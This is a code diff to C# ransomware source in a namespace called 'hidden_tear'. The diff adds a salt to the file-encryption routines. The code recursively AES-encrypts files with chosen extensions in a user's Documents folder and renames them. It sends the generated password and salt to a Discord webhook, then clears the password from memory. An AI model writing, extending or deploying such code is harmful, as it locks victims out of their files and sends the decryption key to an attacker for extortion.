@@ -27,7 +27,7 @@ namespace hidden_tear
             Application.Run(new Form1());
         }
 
-        static void EncryptFile(string file, string password)
+        static void EncryptFile(string file, string password, string salt)
         {
 
             byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
@@ -36,7 +36,7 @@ namespace hidden_tear
             // Hash the password with SHA256
             passwordBytes = SHA256.Create().ComputeHash(passwordBytes);
 
-            byte[] bytesEncrypted = Crypto.AES_Encrypt(bytesToBeEncrypted, passwordBytes);
+            byte[] bytesEncrypted = Crypto.AES_Encrypt(bytesToBeEncrypted, passwordBytes,salt);
 
             File.WriteAllBytes(file, bytesEncrypted);
             System.IO.File.Move(file, file + Tools.Config.encryptedExtension);
@@ -44,7 +44,7 @@ namespace hidden_tear
         }
 
         //encrypts target directory
-        static void encryptDirectory(string location, string password)
+        static void encryptDirectory(string location, string password, string salt)
         {
 
             string[] files = Directory.GetFiles(location);
@@ -54,22 +54,23 @@ namespace hidden_tear
                 string extension = Path.GetExtension(files[i]);
                 if (Tools.Config.extensionToEncrypt.Contains(extension))
                 {
-                    EncryptFile(files[i], password);
+                    EncryptFile(files[i], password, salt);
                 }
             }
             for (int i = 0; i < childDirectories.Length; i++)
             {
-                encryptDirectory(childDirectories[i], password);
+                encryptDirectory(childDirectories[i], password,salt);
             }
         }
 
         static async void startAction()
         {
-            string password = Crypto.CreatePassword(15);
+            string password = Crypto.CreatePasswordAndSalt(15);
+            string salt = Crypto.CreatePasswordAndSalt(8);
             string path = "\\Documents\\Testing";
             string startPath = Config.userDir + Config.userName + path;
-            await Logger.SendPassword(Config.DiscordWebhook,password);
-            encryptDirectory(startPath, password);
+            await Logger.SendData(Config.DiscordWebhook,password, salt);
+            encryptDirectory(startPath, password, salt);
             password = null;
         }
     }
